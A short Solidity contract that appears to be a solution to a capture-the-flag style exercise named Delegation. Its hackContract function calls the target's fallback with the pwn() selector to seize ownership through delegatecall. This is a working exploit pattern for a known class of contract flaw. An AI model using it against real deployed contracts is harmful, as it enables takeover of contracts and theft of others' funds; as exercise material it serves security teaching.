// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Delegation.sol";
import "hardhat/console.sol";

contract AttackingDelegation {
    address public contractAddress;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        // Code me!

        // execute delegation fallback function 
          contractAddress.call(abi.encodeWithSignature("pwn()"));
        
    }
}
